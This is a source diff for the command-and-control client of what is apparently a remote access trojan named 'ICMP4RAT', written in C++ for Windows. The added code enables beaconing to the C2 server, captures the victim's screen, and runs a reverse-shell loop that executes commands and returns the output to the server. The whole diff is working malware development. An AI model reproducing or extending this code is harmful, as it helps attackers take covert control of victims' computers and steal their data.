@@ -1,9 +1,11 @@
+#include <stdlib.h>
 #include <iostream>
 #include <string>
 #include <map>
 #include <ole2.h>
 #include <olectl.h>
 #include "cncManager.h"
+#include "commandManager.h"
 
 cncManager::cncManager() {
 	this->hSession = WinHttpOpen(L"ICMP4RAT", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
@@ -156,7 +158,6 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
 
             case shellRequest:
                 std::cout << "shellRequest !!!" << std::endl;
-                //ShellExecute 사용하는 함수 만들면 될듯.
                 break;
 
             case ftpReqeust:
@@ -176,8 +177,17 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
 
 /* For DEBUG */
 int main() {
+    commandManager cmd;
 	cncManager client;
-    //client.sendBeacon();
-    const char* ptr = "JustForTestTestTest";
-    client.sendData(ftpResponse, strlen(ptr), (LPVOID)ptr);
+    client.sendBeacon();
+
+    cmd.getScreen("abcd.bmp");
+    while (TRUE) {
+        std::string str;
+        std::cout << "Insert key : ";
+        std::getline(std::cin,str);
+        str =  cmd.reverseShell(str.c_str());
+        std::cout << str << std::endl;
+        client.sendData(shellResponse, str.size(), (LPVOID)str.c_str());
+    }
 }
